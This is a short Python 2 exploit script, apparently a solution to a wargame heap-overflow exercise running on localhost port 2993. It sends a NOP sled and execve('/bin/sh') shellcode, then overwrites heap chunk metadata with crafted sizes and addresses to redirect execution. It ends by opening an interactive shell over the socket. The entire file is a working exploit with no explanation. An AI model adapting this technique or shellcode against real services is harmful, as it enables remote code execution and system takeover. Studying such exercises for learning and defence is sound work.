import struct
import socket
import telnetlib

HOST = "127.0.0.1"
PORT = 2993
REQSZ = 128

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))

def recvUntil(check):
	buffer = ""
	while check not in buffer:
		buffer += s.recv(1)
	return buffer

def pad(message):
	padding = '\x00' * (REQSZ - (len(message)))
	new_message = "FSRD" + message + padding
	print len(new_message)
	return new_message[:REQSZ]


shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = "FSRD/ROOT///" + "\x90\x90\x90\x90\x90\x90\xeb\x04" + "AAAA" + shellcode
first_run = payload + "/" * (REQSZ - len(payload))
s.send(first_run)
raw_input("> Press enter")
payload = "FSRDROOT/" + struct.pack("I",0xfffffffc) + struct.pack("I",0xfffffffc) + struct.pack("I",0x804d410) + struct.pack("I",0x804e014)
second_run = payload + "A" * (REQSZ - len(payload))
s.send(second_run)

while True:
	msg = raw_input("> ");
	if msg:
		print 'msg: {0}'.format(repr(pad(msg)))
		s.send(pad(msg))
	else:
		break

#print recvUntil("[final1] $ ")

t = telnetlib.Telnet()
t.sock = s
t.interact()
